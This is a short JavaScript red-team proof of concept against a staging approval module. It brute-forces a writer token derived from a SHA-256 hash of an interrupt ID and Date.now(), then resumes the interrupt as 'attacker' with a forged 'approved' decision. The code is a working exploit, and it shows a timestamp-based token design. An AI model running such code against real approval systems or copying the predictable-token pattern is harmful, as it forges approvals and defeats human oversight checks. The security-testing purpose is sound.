'use strict';
/**
 * REDTEAM PoC vs impl-safety/staging/orca_approval.js
 * Attack 1: writer-token predictability.
 * openInterrupt derives writerToken = sha256(interruptId + ':' + Date.now()).
 * Date.now() is enumerable (~ms precision): an attacker who knows (or can
 * guess) the interruptId brute-forces the token and wins the single-writer
 * CAS, defeating the checkpoint-fork protection.
 */
const approval = require('/home/hatch/workspace/orca-finish/wave2/impl-safety/staging/orca_approval.js');

const interruptId = 'interrupt-001'; // attacker-observable (evidence files, logs)
const before = Date.now();
const interrupt = approval.openInterrupt({ interruptId, requester: 'coordinator' });
const after = Date.now();
console.log('issued writerToken:', interrupt.writerToken);

// Attacker brute-forces Date.now() over the observed window.
const crypto = require('crypto');
let recovered = null;
for (let t = before - 5000; t <= after + 5000; t++) {
  const cand = 'wt_' + crypto.createHash('sha256').update(interruptId + ':' + t, 'utf8').digest('hex').slice(0, 24);
  if (cand === interrupt.writerToken) { recovered = cand; console.log('recovered at t=', t); break; }
}
if (recovered) {
  // Attacker resumes the interrupt as themselves, racing the real responder.
  const resumed = approval.resumeInterrupt({
    interrupt, writerToken: recovered, responder: 'attacker', decision: 'approved', findings: 'forged',
  });
  console.log('ATTACKER RESUME SUCCEEDED — single-writer CAS defeated:', resumed.status);
  console.log('RESULT: HOLE DEMONSTRATED');
  process.exit(0);
} else {
  console.log('RESULT: token not recovered in window');
  process.exit(1);
}
